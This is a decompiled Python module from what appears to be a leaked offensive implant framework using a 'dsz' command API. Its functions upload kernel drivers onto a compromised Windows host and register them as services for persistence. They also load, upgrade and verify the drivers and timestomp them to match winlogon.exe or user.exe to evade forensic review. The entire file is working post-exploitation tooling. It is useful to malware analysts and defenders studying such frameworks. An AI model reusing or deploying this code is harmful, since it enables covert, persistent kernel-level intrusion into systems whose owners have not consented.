# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.file
import dsz.path
import dsz.version

def Install(project, driverName, localDriverName, startValue, typeValue, ask=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.control.wow64.Disable()
    if _isDriverSigningEnabled():
        dsz.ui.Echo('* Cannot install because driver signing is enabled', dsz.ERROR)
        return False
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    if ask and not dsz.ui.Prompt('Do you want to install the %s driver (%s.sys)?' % (project, driverName)):
        return False
    try:
        systemroot = dsz.path.windows.GetSystemPath()
    except:
        dsz.ui.Echo('* Unable to determine system root', dsz.ERROR)
        return False

    if dsz.cmd.Run('registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s' % driverName):
        dsz.ui.Echo('%s (%s.sys) is already installed (key exists)' % (project, driverName), dsz.ERROR)
        return False
    if dsz.file.Exists('%s.sys' % driverName, '%s\\drivers' % systemroot):
        dsz.ui.Echo('%s (%s.sys) is already installed (file exists)' % (project, driverName), dsz.ERROR)
        return False
    dsz.ui.Echo('Uploading the SYS')
    if dsz.cmd.Run('put "%s" -name "%s\\drivers\\%s.sys" -permanent -project %s' % (localDriverName, systemroot, driverName, project)):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
    dsz.ui.Echo('Matching file time for %s.sys' % driverName)
    if dsz.version.checks.IsOs64Bit():
        matchFile = '%s\\winlogon.exe' % systemroot
    else:
        matchFile = '%s\\user.exe' % systemroot
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s.sys"' % (matchFile, systemroot, driverName)):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED (but continuing anyway)', dsz.WARNING)
    keysAdded = True
    dsz.ui.Echo('Adding registry keys')
    if not dsz.cmd.Run('registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s' % driverName):
        keysAdded = False
    elif not dsz.cmd.Run('registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s -value ErrorControl -type REG_DWORD -data 0' % driverName):
        keysAdded = False
    elif not dsz.cmd.Run('registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s -value Start -type REG_DWORD -data %u' % (driverName, startValue)):
        keysAdded = False
    elif not dsz.cmd.Run('registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s -value Type -type REG_DWORD -data %u' % (driverName, typeValue)):
        keysAdded = False
    if keysAdded:
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
    return True


def Load(driverName):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        dsz.ui.Echo('Loading %s' % driverName)
        if dsz.cmd.Run('drivers -load %s' % driverName):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False


def Uninstall(project, driverName, ask=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.control.wow64.Disable()
    rtn = True
    if len(driverName) == 0:
        dsz.ui.Echo('Invalid driver name given', dsz.ERROR)
        return False
    if ask and not dsz.ui.Prompt('Do you want to uninstall the %s driver (%s.sys)?' % (project, driverName)):
        return False
    try:
        systemroot = dsz.path.windows.GetSystemPath()
    except:
        dsz.ui.Echo('* Unable to determine system root', dsz.ERROR)
        return False

    if not Unload(driverName):
        rtn = False
    dsz.ui.Echo('Removing registry key')
    if dsz.cmd.Run('registrydelete -hive L -key SYSTEM\\CurrentControlSet\\Services\\%s -recursive' % driverName):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        rtn = False
    dsz.ui.Echo('Removing %s.sys' % driverName)
    if dsz.cmd.Run('delete -file "%s\\drivers\\%s.sys"' % (systemroot, driverName)):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        rtn = False
    return rtn


def Unload(driverName):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    else:
        dsz.ui.Echo('Unloading %s' % driverName)
        if dsz.cmd.Run('drivers -unload %s' % driverName):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False


def VerifyInstall(driverName, startValue, typeValue):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.control.wow64.Disable()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    try:
        systemroot = dsz.path.windows.GetSystemPath()
    except:
        dsz.ui.Echo('* Unable to determine system root', dsz.ERROR)
        return False

    rtn = True
    dsz.ui.Echo('Checking for %s.sys' % driverName)
    if dsz.file.Exists('%s.sys' % driverName, '%s\\drivers' % systemroot):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        rtn = False
    keyLoc = 'SYSTEM\\CurrentControlSet\\Services\\%s' % driverName
    dsz.ui.Echo('Checking for key')
    if dsz.cmd.Run('registryquery -hive L -key %s' % keyLoc):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        rtn = False
    dsz.ui.Echo('Checking for key/ErrorControl')
    if dsz.cmd.Run('registryquery -hive L -key %s -value ErrorControl' % keyLoc, dsz.RUN_FLAG_RECORD):
        valueGood = False
        try:
            type = dsz.cmd.data.Get('Key::Value::Type', dsz.TYPE_STRING)
            if type[0] == 'REG_DWORD':
                data = dsz.cmd.data.Get('Key::Value::Value', dsz.TYPE_STRING)
                if len(data[0]) > 0 and int(data[0]) == 0:
                    valueGood = True
        except:
            pass

        if valueGood:
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
        else:
            dsz.ui.Echo('    FAILED (value is bad)', dsz.ERROR)
            rtn = False
    else:
        dsz.ui.Echo('    FAILED (value not found)', dsz.ERROR)
        rtn = False
    dsz.ui.Echo('Checking for key/Start')
    if dsz.cmd.Run('registryquery -hive L -key %s -value Start' % keyLoc, dsz.RUN_FLAG_RECORD):
        valueGood = False
        try:
            type = dsz.cmd.data.Get('Key::Value::Type', dsz.TYPE_STRING)
            if type[0] == 'REG_DWORD':
                data = dsz.cmd.data.Get('Key::Value::Value', dsz.TYPE_STRING)
                if len(data[0]) > 0 and int(data[0]) == startValue:
                    valueGood = True
        except:
            pass

        if valueGood:
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
        else:
            dsz.ui.Echo('    FAILED (value is bad)', dsz.ERROR)
            rtn = False
    else:
        dsz.ui.Echo('    FAILED (value not found)', dsz.ERROR)
        rtn = False
    dsz.ui.Echo('Checking for key/Type')
    if dsz.cmd.Run('registryquery -hive L -key %s -value Type' % keyLoc, dsz.RUN_FLAG_RECORD):
        valueGood = False
        try:
            type = dsz.cmd.data.Get('Key::Value::Type', dsz.TYPE_STRING)
            if type[0] == 'REG_DWORD':
                data = dsz.cmd.data.Get('Key::Value::Value', dsz.TYPE_STRING)
                if len(data[0]) > 0 and int(data[0]) == typeValue:
                    valueGood = True
        except:
            pass

        if valueGood:
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
        else:
            dsz.ui.Echo('    FAILED (value is bad)', dsz.ERROR)
            rtn = False
    else:
        dsz.ui.Echo('    FAILED (value not found)', dsz.ERROR)
        rtn = False
    return rtn


def VerifyRunning(driverName):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.control.wow64.Disable()
    if len(driverName) == 0:
        dsz.ui.Echo('* Invalid driver name given', dsz.ERROR)
        return False
    dsz.ui.Echo('Getting driver list')
    if dsz.cmd.Run('drivers -list -minimal', dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED (query of running drivers failed)', dsz.ERROR)
        return False
    try:
        drivers = dsz.cmd.data.Get('DriverItem', dsz.TYPE_OBJECT)
    except:
        dsz.ui.Echo('    FAILED (failed to get driver list data)', dsz.ERROR)
        return False

    lowerDriverName = driverName.lower()
    fullLowerDriverName = '%s.sys' % driverName.lower()
    dsz.ui.Echo('Checking for %s' % driverName)
    for driverObj in drivers:
        try:
            name = dsz.cmd.data.ObjectGet(driverObj, 'Name', dsz.TYPE_STRING)
            namePieces = dsz.path.Split(name[0])
            if namePieces[1].lower() == lowerDriverName or namePieces[1].lower() == fullLowerDriverName:
                dsz.ui.Echo('    SUCCESS', dsz.GOOD)
                return True
        except:
            pass

    dsz.ui.Echo('    FAILED (driver not running)', dsz.ERROR)
    return False


def UpgradeDriver(project, drvName, ask=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    systemRoot = dsz.path.windows.GetSystemPath()
    tmpName = '%s32.sys' % drvName
    dsz.ui.Echo('Move existing driver')
    if not dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, drvName, systemRoot, tmpName)):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
    dsz.ui.Echo('    MOVED', dsz.GOOD)
    dsz.ui.Echo('Uploading the SYS file')
    if not dsz.cmd.Run('put "%s.sys" -name "%s\\drivers\\%s.sys" -permanent -project %s' % (drvName, systemRoot, drvName, project)):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, tmpName, systemRoot, drvName))
        return False
    dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    if dsz.version.checks.IsOs64Bit():
        matchFile = '%s\\winlogon.exe' % systemRoot
    else:
        matchFile = '%s\\user.exe' % systemRoot
    dsz.ui.Echo('Matching file times for %s.sys with %s' % (drvName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s.sys"' % (matchFile, systemRoot, drvName)):
        dsz.ui.Echo('    MATCHED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.WARNING)
    dsz.ui.Echo('Matching file times for %s with %s' % (tmpName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s"' % (matchFile, systemRoot, tmpName)):
        dsz.ui.Echo('    MATCHED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.WARNING)
    dsz.ui.Echo('Deleting existing driver')
    if dsz.cmd.Run('delete -file "%s\\drivers\\%s" -afterreboot' % (systemRoot, tmpName)):
        dsz.ui.Echo('    MOVED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
    dsz.ui.Echo('Upgrade complete (reboot required)')
    return True


def _isDriverSigningEnabled():
    if dsz.version.checks.windows.IsVistaOrGreater():
        if dsz.version.checks.IsOs64Bit():
            return True
    return False